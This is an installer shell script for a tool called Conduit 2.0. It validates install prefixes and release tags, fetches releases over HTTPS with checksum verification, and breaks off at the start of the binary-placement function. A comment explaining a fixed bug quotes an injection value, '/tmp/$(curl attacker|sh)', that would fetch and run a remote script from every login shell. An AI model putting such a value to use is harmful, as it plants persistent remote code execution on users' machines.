#!/usr/bin/env bash
#
# install.sh - install Conduit 2.0.
#
# Conduit 2.0 is one binary. There is no daemon, no service to register, no
# containers to pull and no model to preload. This script copies an executable
# into place, points an AI client at it, and prints the diagnostics.
#
# That is the whole difference from v1, whose installer had to install a
# container runtime, pull two database images, start them, write a launchd or
# systemd unit, and download a model -- any one of which could fail on a machine
# where Conduit itself would have worked fine.
#
# The embedding model is NOT downloaded by default. It is a few hundred
# megabytes and this script should not start that transfer on a metered
# connection without being asked. Pass --model, or run `conduit model download`
# whenever you like; until then search works on keyword matching.
#
# Usage:
#   ./install.sh                        # download a published release
#   ./install.sh --from-source          # build from this checkout (needs Go)
#   ./install.sh --from-source --model  # build and fetch the embedding model
#
# PIPED INVOCATION
#
#   The release path works piped -- `curl ... | bash` -- because everything it
#   needs is downloaded. --from-source does NOT: it compiles this repository,
#   and a piped script has no repository to compile. bash sets no BASH_SOURCE
#   for a script on stdin, so there is nothing to locate a checkout from either.
#   That combination is detected and reported with clone instructions rather
#   than left to fail as an unbound-variable error.
#
# If you are coming from Conduit 1.x, run scripts/remove-v1.sh first.
#
set -euo pipefail

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

readonly REPO="amlandas/Conduit-AI-Intelligence-Hub"
readonly BINARY="conduit"

# Where releases are looked up and downloaded from.
#
# Both are overridable so that the download path can be exercised against a
# local server holding a locally built artifact -- see tests/scripts -- and so a
# mirror is possible without editing this file. An override is announced loudly
# when it is used, because silently changing where a user's binary comes from is
# the one thing an installer must never do. Checksum verification is not
# relaxed by either: the manifest still has to match the tarball, whatever
# served it.
RELEASE_DOWNLOAD_BASE="${CONDUIT_RELEASE_BASE_URL:-}"
RELEASE_API_BASE="${CONDUIT_RELEASE_API_URL:-https://api.github.com}"

# ARTIFACT CONTRACT -- must match .github/workflows/release.yml exactly.
#
#   conduit-<os>-<arch>.tar.gz   one executable named `conduit` at the root
#   SHA256SUMS                   bare basenames, one line per tarball
#
# Changing either half means changing both.

PREFIX="${CONDUIT_PREFIX:-${HOME}/.local/bin}"
FROM_SOURCE=false
RUN_SETUP=true
DOWNLOAD_MODEL=false
MCP_CLIENT="claude-code"
RELEASE_TAG="latest"

# SUPPORTED_CLIENTS must stay in step with MCPClients() in
# internal/setup/mcpclient.go. It is duplicated here rather than asked of the
# binary because the check has to happen before anything is downloaded or
# built: `--client cursr` used to install the binary, run setup, watch setup
# shrug, and print "Done." with nothing configured.
readonly SUPPORTED_CLIENTS="claude-code cursor vscode"

# Populated by detect_platform.
OS=""
ARCH=""
PLATFORM=""

# Temporary state, all of it owned by the single EXIT trap below.
#
# WORKDIR is the download/build scratch directory. STAGED is the partial copy
# of the binary sitting inside PREFIX between the cp and the atomic rename.
# Both are cleaned up by one handler: this used to be two traps, and the second
# `trap ... EXIT` silently replaced the first, so a failure between them leaked
# whichever the displaced handler owned.
WORKDIR=""
STAGED=""

# Set by resolve_release_tag, which cannot use command substitution: it needs to
# report a reason as well as a value, and `die` inside $( ) exits only the
# subshell.
RESOLVED_TAG=""
RESOLVE_HTTP_STATUS=""

# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------

if [[ -t 1 ]]; then
    C_RESET=$'\033[0m'; C_RED=$'\033[0;31m'; C_GREEN=$'\033[0;32m'
    C_YELLOW=$'\033[0;33m'; C_BLUE=$'\033[0;34m'; C_BOLD=$'\033[1m'
else
    C_RESET=''; C_RED=''; C_GREEN=''; C_YELLOW=''; C_BLUE=''; C_BOLD=''
fi

info()    { printf '%s\n' "${C_BLUE}==>${C_RESET} $*"; }
success() { printf '%s\n' "  ${C_GREEN}OK${C_RESET} $*"; }
warn()    { printf '%s\n' "  ${C_YELLOW}!${C_RESET} $*" >&2; }
die()     { printf '%s\n' "${C_RED}error:${C_RESET} $*" >&2; exit 1; }

usage() {
    cat <<'EOF'
install.sh - install Conduit 2.0

USAGE
    ./install.sh [OPTIONS]

OPTIONS
    --from-source       Build from this checkout. Requires Go 1.21+ and a C
                        compiler: the knowledge base uses SQLite FTS5, which
                        needs cgo.
    --version TAG       Release tag to install, e.g. v2.0.0-beta.1. The default
                        is the newest v2 release. Ignored with --from-source.
    --prefix DIR        Where to install the binary. Must be an ABSOLUTE path.
                        Default: ~/.local/bin, or $CONDUIT_PREFIX.
    --model             Download and verify the embedding model after install.
                        A few hundred MB. Off by default.
    --client NAME       AI client to configure: claude-code, cursor, vscode.
                        Default: claude-code. An unrecognised name is refused
                        before anything is installed.
    --no-setup          Install the binary only. Do not configure an AI client
                        and do not create the data directory.
    -h, --help          Show this help.

WHAT IT CHANGES
    - installs the conduit binary to --prefix
    - appends a PATH block, marked with a "# Conduit" comment, to the file your
      shell reads at startup, if the prefix is not already on PATH:
        zsh            ~/.zshrc
        bash on macOS  ~/.bash_profile (or ~/.bash_login / ~/.profile if you
                       already have one -- macOS terminals start a login shell,
                       which never reads ~/.bashrc)
        bash on Linux  ~/.bashrc
      That marker is what lets uninstall.sh remove the block later without
      guessing at your own edits.
    - unless --no-setup, runs `conduit setup`, which creates the data directory
      (~/.conduit) and its knowledge base file, and registers the MCP server
      with an AI client
    - with --model, downloads the embedding model into the data directory

    It installs no services, pulls no containers, and starts nothing at login.

    It does NOT install document extraction tools. `conduit setup` can install
    poppler (for PDF text) through Homebrew or apt, and this script passes
    --skip-tools so that an install never runs a package manager unattended.
    Run `conduit setup` yourself, or install poppler directly, if you want it.

SUPPORTED PLATFORMS
    macOS arm64 (Apple Silicon), Linux x86_64.

    Intel Macs and Linux arm64 can build from source; there are no published
    binaries for them. Windows is not supported yet -- see install-windows.ps1.

    Published binaries are NOT code-signed or notarised. A binary this script
    downloads is fetched with curl or wget, which do not set the quarantine
    attribute, so it runs. One downloaded through a BROWSER does get
    quarantined; clear it with:
        xattr -d com.apple.quarantine <file>

PIPED INVOCATION
    The release path works piped:
        curl -fsSL https://raw.githubusercontent.com/OWNER/REPO/v2/scripts/install.sh | bash
    --from-source does not: it compiles this repository, and a piped script has
    none. Clone first for that.

ENVIRONMENT
    CONDUIT_PREFIX          Default for --prefix. Held to the same rules: it
                            must be absolute and free of shell metacharacters.
                            uninstall.sh also looks there.
    CONDUIT_RELEASE_BASE_URL   Download release artifacts from here instead of
                            GitHub. Announced when used. Checksum verification
                            still applies.
    CONDUIT_RELEASE_API_URL    Where to look up the newest release
                            (default: https://api.github.com).

UPGRADING FROM CONDUIT 1.x
    This script does not remove the v1 daemon, its service registration or its
    containers. Run scripts/remove-v1.sh first (it defaults to a dry run).

EXAMPLES
    ./install.sh
    ./install.sh --version v2.0.0-beta.1
    ./install.sh --from-source
    ./install.sh --from-source --model --client cursor
    ./install.sh --prefix /usr/local/bin
EOF
}

# ---------------------------------------------------------------------------
# Validating what the user handed us
#
# Everything in this section runs before a byte is downloaded, a directory is
# created or a profile is touched. Two of these checks exist because the value
# they guard ends up somewhere it can do more than name a file.
# ---------------------------------------------------------------------------

# shell_quote renders a string as a single-quoted shell word.
#
# Single quotes suspend every expansion there is, and the one character they
# cannot contain is escaped by closing the quote, emitting an escaped quote and
# reopening: the standard 'it'\''s' idiom.
shell_quote() {
    printf "'%s'" "${1//\'/\'\\\'\'}"
}

# assert_prefix_safe refuses an install prefix that is not a plain absolute
# directory name.
#
# This is not tidiness. The prefix is written into the user's shell profile, and
# it used to be interpolated into a DOUBLE-quoted line:
#
#     printf 'export PATH="%s:$PATH"\n' "$PREFIX"
#
# Double quotes do not suspend command substitution, so
# `--prefix '/tmp/$(curl attacker|sh)'` wrote a line that executed on every
# login, in every shell, forever -- not at install time, where someone might
# notice, but silently thereafter. The write is now single-quoted (see
# add_to_path), and this check refuses the input outright as well: a prefix
# containing shell metacharacters is a mistake or an attack in every case, and
# nothing legitimate is lost by rejecting it.
#
# Relative paths are refused for the same reason uninstall.sh refuses a relative
# --data-dir: "bin" resolves against whatever directory the script was run from,
# and a PATH entry pointing at a relative path is a different directory in every
# shell that reads it.
assert_prefix_safe() {
    local prefix="$1" source_label="$2"

    [[ -n "${prefix//[[:space:]]/}" ]] || \
        die "${source_label} requires a directory (got an empty value)"

    [[ "$prefix" == /* ]] || die \
        "${source_label} must be an absolute path (got: '${prefix}').

A relative path resolves against whichever directory this script was run from,
and the PATH entry written to your shell profile would name a different
directory in every shell that read it. Use an absolute path:

    ${source_label} \"\$PWD/${prefix#./}\""

    # A newline cannot be seen by the character check below -- tr deletes it and
    # the leftover is an empty line -- so it is tested for on its own. A prefix
    # containing one would write two lines into the profile, only the first of
    # which the uninstaller's two-line block removal knows about.
    case "$prefix" in
        *"
"*) die "${source_label} must not contain a newline" ;;
    esac

    # A whitelist, not a blacklist. Listing the dangerous characters means
    # every character nobody thought of is permitted, and this value reaches a
    # file the shell evaluates.
    local leftover
    leftover="$(LC_ALL=C printf '%s' "$prefix" | LC_ALL=C tr -d 'A-Za-z0-9 ._/+@,=-')"
    if [[ -n "$leftover" ]]; then
        die "${source_label} contains characters that are not allowed in an install prefix: ${leftover}

The prefix is written into your shell startup file. Characters the shell treats
specially -- \$ \` \" ' \\ ; & | < > ( ) and the like -- would be interpreted
there rather than read as part of a directory name.

Allowed: letters, digits, space, and . _ / + @ , = -"
    fi
}

# assert_tag_shape refuses a --version value that is not a v2 release tag.
#
# The tag is concatenated into a download URL, so it is a path segment, and a
# value like '../download/v2.0.0-beta.3' traverses out of the release directory
# while every message the script prints goes on calling it the version being
# installed. Constraining it to the shape releases actually use -- ^v2\.[0-9A-Za-z.-]+$ --
# removes both the traversal and the mislabelling.
#
# Applied to a tag resolved from the API as well as to one typed by the user:
# the API is a remote party, and a tag is a remote party's string.
assert_tag_shape() {
    local tag="$1" source_label="$2"

    [[ -n "${tag//[[:space:]]/}" ]] || die "${source_label} requires a tag (got an empty value)"

    case "$tag" in
        v2.?*) ;;
        *) die "${source_label} must name a v2 release tag, e.g. v2.0.0-beta.1 (got: '${tag}')" ;;
    esac

    local leftover
    leftover="$(LC_ALL=C printf '%s' "$tag" | LC_ALL=C tr -d 'A-Za-z0-9.-')"
    if [[ -n "$leftover" ]]; then
        die "${source_label} must match v2.<letters, digits, dots, hyphens> (got: '${tag}')

A release tag becomes a path segment in the download URL. Characters outside
that set could reshape the URL to point somewhere other than the release."
    fi

    case "$tag" in
        *..*) die "${source_label} must not contain '..' (got: '${tag}')" ;;
    esac
}

# assert_client_supported refuses an AI client this build does not know.
#
# Previously an unrecognised name travelled all the way to `conduit setup`,
# which printed a warning and exited 0 -- so a typo produced a complete install,
# a cheerful "Done.", and no configured client anywhere. Failing here costs the
# user a re-run of one command instead.
assert_client_supported() {
    local want="$1" known
    for known in $SUPPORTED_CLIENTS; do
        [[ "$want" == "$known" ]] && return 0
    done
    die "unknown --client: '${want}'

Supported clients: ${SUPPORTED_CLIENTS// /, }"
}

# ---------------------------------------------------------------------------
# Arguments
# ---------------------------------------------------------------------------

# Which of --prefix and CONDUIT_PREFIX supplied the value, so the refusal names
# the thing the user actually set.
PREFIX_SOURCE="--prefix"
[[ -n "${CONDUIT_PREFIX:-}" ]] && PREFIX_SOURCE="CONDUIT_PREFIX"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --from-source) FROM_SOURCE=true; shift ;;
        --model)       DOWNLOAD_MODEL=true; shift ;;
        --no-setup)    RUN_SETUP=false; shift ;;
        --prefix)
            [[ $# -ge 2 ]] || die "--prefix requires a directory"
            PREFIX="$2"; PREFIX_SOURCE="--prefix"; shift 2 ;;
        --version)
            [[ $# -ge 2 ]] || die "--version requires a tag"
            RELEASE_TAG="$2"; shift 2 ;;
        --client)
            [[ $# -ge 2 ]] || die "--client requires a name"
            MCP_CLIENT="$2"; shift 2 ;;
        -h|--help)     usage; exit 0 ;;
        *)             die "unknown option: $1 (try --help)" ;;
    esac
done

assert_prefix_safe "$PREFIX" "$PREFIX_SOURCE"
assert_client_supported "$MCP_CLIENT"
# "latest" is this script's own sentinel, not a tag; it is resolved against the
# API and the result is checked there.
[[ "$RELEASE_TAG" == "latest" ]] || assert_tag_shape "$RELEASE_TAG" "--version"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

have() { command -v "$1" >/dev/null 2>&1; }

# cleanup owns every temporary thing this script creates.
#
# ONE handler, deliberately. install_binary used to install a second
# `trap ... EXIT` for its staging file, which REPLACED this one rather than
# adding to it -- bash has a single handler per signal. A failure in the copy or
# the rename then left the whole download directory behind, and the run that
# reinstated this trap afterwards left the staging file behind instead. Neither
# leak was visible, because both are cleaned up on the paths that succeed.
cleanup() {
    if [[ -n "$STAGED" && -e "$STAGED" ]]; then
        rm -f -- "$STAGED" || true
    fi
    if [[ -n "$WORKDIR" && -d "$WORKDIR" ]]; then
        rm -rf -- "$WORKDIR" || true
    fi
    return 0
}
trap cleanup EXIT

# script_path prints the path this script was invoked as, or nothing.
#
# The ":-" is load-bearing. bash sets no BASH_SOURCE at all for a script read
# from standard input, and under `set -u` bash 3.2 -- still /bin/bash on macOS --
# aborts on a bare "${BASH_SOURCE[0]}" with
#
#     install.sh: line 227: BASH_SOURCE[0]: unbound variable
#
# which is what `curl ... | bash -s -- --from-source` used to produce: a message
# about a shell variable where the actual problem is that there is no checkout.
script_path() {
    printf '%s' "${BASH_SOURCE[0]:-}"
}

# repo_root prints the Conduit checkout this script lives in, or fails.
repo_root() {
    local self script_dir
    self="$(script_path)"
    [[ -n "$self" ]] || return 1

    script_dir="$(cd -- "$(dirname -- "$self")" 2>/dev/null && pwd)" || return 1
    (cd -- "${script_dir}/.." 2>/dev/null && pwd) || return 1
}

# have_checkout reports whether the repository is on this machine, next to us.
#
# It decides which instructions the error messages give. Telling a user who
# piped this script from curl to "run ./scripts/install.sh --from-source" names
# a file that does not exist on their machine, and they have no way to know that
# from the message.
have_checkout() {
    local root
    root="$(repo_root)" || return 1
    [[ -n "$root" && -f "${root}/go.mod" ]]
}

# from_source_hint prints the instructions that actually work from here.
from_source_hint() {
    if have_checkout; then
        printf '%s' "    ./scripts/install.sh --from-source"
    else
        printf '%s' "    git clone https://github.com/${REPO}
    cd ${REPO##*/}
    ./scripts/install.sh --from-source"
    fi
}

# remove_v1_hint prints how to reach remove-v1.sh from here.
remove_v1_hint() {
    if have_checkout; then
        printf '%s' "    ./scripts/remove-v1.sh            # dry run, shows what it found
    ./scripts/remove-v1.sh --yes      # remove them"
    else
        printf '%s' "    git clone https://github.com/${REPO}
    cd ${REPO##*/}
    ./scripts/remove-v1.sh            # dry run, shows what it found
    ./scripts/remove-v1.sh --yes      # remove them"
    fi
}

# sha256_of prints the SHA-256 of a file, on either macOS or Linux.
sha256_of() {
    local file="$1"
    if have sha256sum; then
        sha256sum "$file" | awk '{print $1}'
    elif have shasum; then
        shasum -a 256 "$file" | awk '{print $1}'
    else
        die "no sha256sum or shasum on this machine; cannot verify the download"
    fi
}

detect_platform() {
    local raw_os raw_arch
    raw_os="$(uname -s)"
    raw_arch="$(uname -m)"

    case "$raw_os" in
        Darwin) OS="darwin" ;;
        Linux)  OS="linux" ;;
        *)      die "unsupported operating system: $raw_os (macOS and Linux only)" ;;
    esac

    case "$raw_arch" in
        arm64|aarch64) ARCH="arm64" ;;
        x86_64|amd64)  ARCH="amd64" ;;
        *)             die "unsupported architecture: $raw_arch" ;;
    esac

    # Hyphens, matching the artifact names the release workflow publishes.
    PLATFORM="${OS}-${ARCH}"
}

# ---------------------------------------------------------------------------
# Install from source
# ---------------------------------------------------------------------------

install_from_source() {
    info "Building from source"

    # A checkout is what --from-source compiles, and there are two ways not to
    # have one: the script was piped from curl (no BASH_SOURCE, nothing to
    # locate anything from) or it was copied somewhere on its own. Both used to
    # end in a confusing failure -- an unbound-variable abort for the first, a
    # "no go.mod at /" for the second -- so both are reported as the same
    # actionable thing.
    local root
    if ! root="$(repo_root)" || [[ -z "$root" ]] || [[ ! -f "${root}/go.mod" ]]; then
        die "--from-source builds this repository, and there is no Conduit checkout here.

The release path works without one, including piped from curl:

    ./install.sh                      # newest published v2 release

To build from source, clone first:

$(from_source_hint)"
    fi

    have go || die "Go is not installed. Install Go 1.21+ from https://go.dev/dl/ and retry."

    # cgo is not optional here. The knowledge base is SQLite with FTS5, and a
    # CGO_ENABLED=0 build produces a binary that compiles, starts, and then
    # fails every single search with 'no such module: fts5'.
    if ! have cc && ! have gcc && ! have clang; then
        die "no C compiler found. cgo is required for SQLite FTS5.
  macOS: xcode-select --install
  Linux: apt install build-essential  (or the equivalent)"
    fi

    local version build_time
    version="$(git -C "$root" describe --tags --always --dirty 2>/dev/null || echo dev)"
    build_time="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

    WORKDIR="$(mktemp -d)"
    local out="${WORKDIR}/${BINARY}"

    info "Compiling ${BINARY} ${version} (this takes a minute)"
    (
        cd "$root"
        # main.Version and main.BuildTime are capitalised -- see cmd/conduit.
        # Go's linker silently ignores -X for a symbol that does not exist, so
        # the lower-cased names that used to be here did not fail the build:
        # they produced a binary that reported "dev" for every source install
        # ever made, which is exactly the wrong thing for a bug report to say.
        CGO_ENABLED=1 go build \
            -tags fts5 \
            -ldflags "-s -w -X main.Version=${version} -X main.BuildTime=${build_time}" \
            -o "$out" \
            ./cmd/conduit
    ) || die "build failed"

    [[ -x "$out" ]] || die "build produced no binary at $out"
    success "built ${version}"

    install_binary "$out"
}

# ---------------------------------------------------------------------------
# Install from a published release
# ---------------------------------------------------------------------------

# assert_release_urls_allowed vets the endpoints this run will download from,
# once, before anything is fetched.
#
# It has to happen here and not inside fetch. Every caller of fetch probes with
# stderr suppressed -- a missing manifest is an expected outcome, not a crash --
# so a refusal raised down there exits the script with no visible reason at all.
# That is how the first version of this behaved: a plaintext URL produced a bare
# non-zero exit and an empty explanation.
#
# HTTPS is the only scheme accepted from the network. Plaintext is permitted
# solely for loopback, which is what lets the tests serve a real artifact from a
# local stub server: a MITM on 127.0.0.1 is not a threat model, and confining
# the exception to loopback means the override cannot be turned into "fetch my
# binary over plaintext from a mirror".
assert_release_urls_allowed() {
    local url
    for url in "$RELEASE_API_BASE" ${RELEASE_DOWNLOAD_BASE:+"$RELEASE_DOWNLOAD_BASE"}; do
        case "$url" in
            https://*) ;;
            http://127.0.0.1|http://127.0.0.1:*|http://127.0.0.1/*) ;;
            http://localhost|http://localhost:*|http://localhost/*) ;;
            *)
                die "refusing to download over a non-HTTPS URL: ${url}

Release artifacts are fetched over HTTPS only. Plaintext is allowed for a
loopback address, and nothing else.

Unset CONDUIT_RELEASE_BASE_URL and CONDUIT_RELEASE_API_URL to use GitHub."
                ;;
        esac
    done
}

# fetch downloads a URL to a path. It fails on HTTP errors rather than saving
# an error page, and it never pipes anything into a shell.
#
# Redirects are followed but pinned to the same scheme: without --proto-redir an
# HTTPS URL that redirects to HTTP would be fetched in the clear, which is the
# whole guarantee gone for the sake of one hop. Anything reaching here on a
# plaintext URL was already vetted as loopback by assert_release_urls_allowed.
fetch() {
    local url="$1" dest="$2"

    local curl_opts=(--fail --location --silent --show-error --output "$dest")
    local wget_opts=(--quiet --output-document="$dest")

    case "$url" in
        https://*)
            curl_opts+=(--proto '=https' --proto-redir '=https' --tlsv1.2)
            wget_opts+=(--https-only)
            ;;
    esac

    if have curl; then
        curl "${curl_opts[@]}" "$url"
    elif have wget; then
        wget "${wget_opts[@]}" "$url"
    else
        die "neither curl nor wget is available; cannot download the release"
    fi
}

# fetch_status downloads a URL and prints the HTTP status code it got.
#
# Unlike fetch it does NOT use --fail, because the whole point is to keep the
# body and the code together: "403 with a rate-limit JSON body" and "200 with a
# captive portal's login page" are different problems with different remedies,
# and both are invisible to a bare success/failure.
#
# It prints "000" when no HTTP exchange happened at all -- DNS failure, refused
# connection, TLS rejection.
fetch_status() {
    local url="$1" dest="$2"

    local curl_opts=(--location --silent --show-error --output "$dest" --write-out '%{http_code}')
    local wget_opts=(--quiet --output-document="$dest" --server-response)

    case "$url" in
        https://*)
            curl_opts+=(--proto '=https' --proto-redir '=https' --tlsv1.2)
            wget_opts+=(--https-only)
            ;;
    esac

    if have curl; then
        curl "${curl_opts[@]}" "$url" 2>/dev/null || printf '000'
        return 0
    fi

    if have wget; then
        # wget prints the response headers to stderr under --server-response.
        # The LAST status line is the one that matters after redirects.
        local headers status
        headers="$(wget "${wget_opts[@]}" "$url" 2>&1 >/dev/null || true)"
        status="$(printf '%s\n' "$headers" \
                  | awk '/^[[:space:]]*HTTP\// {print $2}' | tail -1)"
        printf '%s' "${status:-000}"
        return 0
    fi

    die "neither curl nor wget is available; cannot download the release"
}

# resolve_release_tag turns "latest" into a concrete tag, or explains why it
# could not.
#
# It cannot use https://github.com/OWNER/REPO/releases/latest/download, which is
# what an installer would normally reach for, because GitHub's "latest" EXCLUDES
# pre-releases -- and every v2 release is a pre-release while the binaries are
# unsigned. That endpoint would either 404 or, far worse, quietly serve v0.1.10:
# the newest non-pre-release, from the daemon era, whose artifacts are a
# different product that no longer works.
#
# So the list endpoint is asked instead and the newest v2 entry is taken. GitHub
# returns releases newest first, and drafts are not visible unauthenticated.
#
# It reports through a RETURN CODE and the RESOLVED_TAG global rather than by
# calling die, and it is called WITHOUT command substitution. `die` inside $( )
# exits the subshell and nothing else: the parent carried on, so a 403 printed
# the correct rate-limit error and then, one line later, the flatly wrong "no
# Conduit 2.0 release has been published yet". Two contradictory explanations of
# one failure is worse than either alone.
readonly RESOLVE_OK=0
readonly RESOLVE_NETWORK=1       # nothing answered
readonly RESOLVE_RATE_LIMIT=2    # 403/429 -- the API is refusing us for now
readonly RESOLVE_HTTP=3          # some other HTTP error
readonly RESOLVE_UNPARSEABLE=4   # answered, but not with a releases list
readonly RESOLVE_EMPTY=5         # a real releases list holding no v2 entry

resolve_release_tag() {
    local url="${RELEASE_API_BASE}/repos/${REPO}/releases?per_page=100"
    local body="${WORKDIR}/releases.json"

    RESOLVED_TAG=""
    RESOLVE_HTTP_STATUS="$(fetch_status "$url" "$body")"

    case "$RESOLVE_HTTP_STATUS" in
        000|'')  return "$RESOLVE_NETWORK" ;;
        403|429) return "$RESOLVE_RATE_LIMIT" ;;
        2*)      ;;
        *)       return "$RESOLVE_HTTP" ;;
    esac

    [[ -s "$body" ]] || return "$RESOLVE_UNPARSEABLE"

    # Check the SHAPE of the payload before drawing any conclusion from the
    # absence of a tag in it.
    #
    # The releases endpoint returns a JSON array. A rate-limit message, an API
    # error object and a captive portal's HTML login page are none of them
    # arrays, and every one of them contains no "v2." tag -- which the old code
    # read as "no v2 release has been published", the one explanation that is
    # certainly wrong. A body that is not a list cannot answer the question
    # either way, and has to say so.
    local first
    first="$(head -c 512 "$body" | tr -d '[:space:]' | cut -c1)"
    [[ "$first" == "[" ]] || return "$RESOLVE_UNPARSEABLE"

    # Deliberately a grep rather than a JSON parser: jq is not installed
    # everywhere, and the only field needed is a tag name matching a narrow
    # pattern. Both spellings are handled because the API's whitespace is not
    # part of its contract.
    local tag
    tag="$(grep -o '"tag_name"[[:space:]]*:[[:space:]]*"v2\.[^"]*"' "$body" \
           | sed -e 's/.*"\(v2\.[^"]*\)"$/\1/' \
           | head -1)"

    [[ -n "$tag" ]] || return "$RESOLVE_EMPTY"

    RESOLVED_TAG="$tag"
    return "$RESOLVE_OK"
}

# api_body_excerpt prints a short, printable sample of whatever the API sent.
#
# Control characters are stripped and the length is capped: this goes into an
# error message, and a raw 4 MB HTML page or a terminal escape sequence in it
# would be worse than saying nothing.
api_body_excerpt() {
    local body="${WORKDIR}/releases.json"
    [[ -s "$body" ]] || { printf '(empty response)'; return 0; }
    head -c 300 "$body" | LC_ALL=C tr -d '\000-\010\013\014\016-\037\177' | tr '\n' ' '
}

# die_unresolved reports a failed "latest" resolution in terms of what actually
# went wrong.
die_unresolved() {
    local code="$1"

    case "$code" in
        "$RESOLVE_NETWORK")
            die "could not reach the release API at ${RELEASE_API_BASE}.

Nothing answered -- no DNS, no route, or the connection was refused. Check your
network, or a proxy that needs configuring.

Once you can reach it, or if you already know the tag you want:

    ./install.sh --version v2.0.0-beta.1

To build instead of downloading:

$(from_source_hint)"
            ;;

        "$RESOLVE_RATE_LIMIT")
            die "the release API refused this request (HTTP ${RESOLVE_HTTP_STATUS}).

GitHub rate-limits unauthenticated API calls per IP address -- 60 an hour --
and this is what that looks like. It is not a problem with your install.

Either wait for the limit to reset, or skip the lookup entirely by naming the
release you want. Downloading a named tag does not use the API at all:

    ./install.sh --version v2.0.0-beta.1

Tags are listed at https://github.com/${REPO}/releases

To build instead of downloading:

$(from_source_hint)"
            ;;

        "$RESOLVE_HTTP")
            die "the release API returned HTTP ${RESOLVE_HTTP_STATUS}.

That is a failure at ${RELEASE_API_BASE}, not on this machine. Retry later, or
name the release you want -- which does not use the API:

    ./install.sh --version v2.0.0-beta.1"
            ;;

        "$RESOLVE_UNPARSEABLE")
            die "the release API answered (HTTP ${RESOLVE_HTTP_STATUS}) with something that is not a list of releases.

That is usually a captive portal or a proxy intercepting the request, or an API
error delivered with a 200. It is NOT evidence that no release exists -- this
script cannot tell from here, so it will not guess.

The response began:

    $(api_body_excerpt)

Name the release you want to skip the lookup:

    ./install.sh --version v2.0.0-beta.1"
            ;;

        *)
            die "no Conduit 2.0 release has been published yet.

The release list at ${RELEASE_API_BASE} was read successfully and holds no v2
entry.

Build from source instead:

$(from_source_hint)

That needs Go 1.21+ and a C compiler. If you meant to install a 1.x release,
name it explicitly with --version."
            ;;
    esac
}

install_from_release() {
    # Before anything is downloaded, and before any message implies it will be.
    assert_release_urls_allowed

    WORKDIR="$(mktemp -d)"

    if [[ -n "$RELEASE_DOWNLOAD_BASE" ]]; then
        warn "downloading from ${RELEASE_DOWNLOAD_BASE} (CONDUIT_RELEASE_BASE_URL is set)"
    fi

    # Resolve "latest" to a real tag before anything is downloaded, so every
    # message from here on names the version actually being installed.
    #
    # Called bare, not in $( ): see resolve_release_tag.
    if [[ "$RELEASE_TAG" == "latest" ]]; then
        local rc=0
        resolve_release_tag || rc=$?
        if [[ "$rc" -ne 0 || -z "$RESOLVED_TAG" ]]; then
            die_unresolved "$rc"
        fi
        # The API is a remote party and this value becomes a URL path segment.
        assert_tag_shape "$RESOLVED_TAG" "the tag returned by ${RELEASE_API_BASE}"
        RELEASE_TAG="$RESOLVED_TAG"
    fi

    info "Installing from release (${RELEASE_TAG})"

    # The override replaces GitHub's ".../releases/download" prefix, so the
    # resolved tag still selects the directory. Keeping that structure means an
    # override is a mirror of the same layout rather than a second code path.
    local base tarball sums_url tar_url
    if [[ -n "$RELEASE_DOWNLOAD_BASE" ]]; then
        base="${RELEASE_DOWNLOAD_BASE}/${RELEASE_TAG}"
    else
        base="https://github.com/${REPO}/releases/download/${RELEASE_TAG}"
    fi
    tarball="${BINARY}-${PLATFORM}.tar.gz"
    tar_url="${base}/${tarball}"
    sums_url="${base}/SHA256SUMS"

    # The checksum manifest is fetched first: if it is not there, no release
    # artifacts are, and there is no point downloading a tarball we could not
    # verify anyway.
    if ! fetch "$sums_url" "${WORKDIR}/SHA256SUMS" 2>/dev/null; then
        die "release ${RELEASE_TAG} has no SHA256SUMS, so nothing it publishes can be verified.

Check the tag name, or build from source instead:

$(from_source_hint)"
    fi

    local expected
    expected="$(awk -v f="$tarball" '$2 == f || $2 == "*"f {print $1}' "${WORKDIR}/SHA256SUMS" | head -1)"
    if [[ -z "$expected" ]]; then
        # Naming what the release does publish turns "unsupported" into a fact
        # the user can act on -- most often that they are on an architecture
        # with no prebuilt binary rather than that the release is broken.
        local available
        available="$(awk '{print "    " $2}' "${WORKDIR}/SHA256SUMS")"
        die "release ${RELEASE_TAG} publishes no ${tarball}.

This platform (${PLATFORM}) has no prebuilt binary. That release contains:
${available}

Build from source instead:

$(from_source_hint)"
    fi

    info "Downloading ${tarball}"
    fetch "$tar_url" "${WORKDIR}/${tarball}" || \
        die "download failed: ${tar_url}"

    # Verification is mandatory. There is no flag to skip it.
    local actual
    actual="$(sha256_of "${WORKDIR}/${tarball}")"
    if [[ "$actual" != "$expected" ]]; then
        rm -f -- "${WORKDIR}/${tarball}"
        die "checksum mismatch for ${tarball}
  expected  ${expected}
  got       ${actual}
The download was deleted. Do not install this artifact."
    fi
    success "checksum verified"

    tar -xzf "${WORKDIR}/${tarball}" -C "$WORKDIR" || die "could not extract ${tarball}"

    local extracted="${WORKDIR}/${BINARY}"
    [[ -f "$extracted" ]] || die "${tarball} does not contain a '${BINARY}' binary"
    chmod +x "$extracted"

    install_binary "$extracted"
}

# ---------------------------------------------------------------------------
# Placing the binary
# ---------------------------------------------------------------------------

# preflight_prefix settles everything about the destination BEFORE the network
# is touched.
#
# The writability check used to live in install_binary, which runs after the
# release has been resolved, the manifest fetched, the tarball downloaded and
# the checksum verified. A root-owned ~/.local/bin -- not rare, it is what one
# `sudo pip install --user` leaves behind -- therefore cost the user the whole
# transfer before telling them the one thing they needed to know first.
preflight_prefix() {
    local dest="${PREFIX}/${BINARY}"

    if [[ -e "$PREFIX" && ! -d "$PREFIX" ]]; then
        die "${PREFIX} exists and is not a directory, so nothing can be installed into it."
    fi

    mkdir -p -- "$PREFIX" || die "cannot create ${PREFIX}.

Choose another --prefix, or create it yourself with the right ownership."

    [[ -w "$PREFIX" ]] || die "${PREFIX} is not writable by this user.

Choose another --prefix, or fix the ownership:

    sudo chown -R \"\$(id -un)\" ${PREFIX}"

    # A DIRECTORY at the destination is refused rather than worked around.
    #
    # `mv -f staged dest` does not fail when dest is a directory: it moves the
    # file INSIDE it. The install then reported "OK installed <dest>" and exited
    # 0 with the binary sitting at <dest>/conduit.new.<pid> -- a name nothing
    # will ever execute, under a directory the user believes is the binary.
    if [[ -d "$dest" ]]; then
        die "${dest} is a directory, not a Conduit binary.

Something else owns that name. Remove it, or install elsewhere with --prefix."
    fi
}

install_binary() {
    local src="$1"
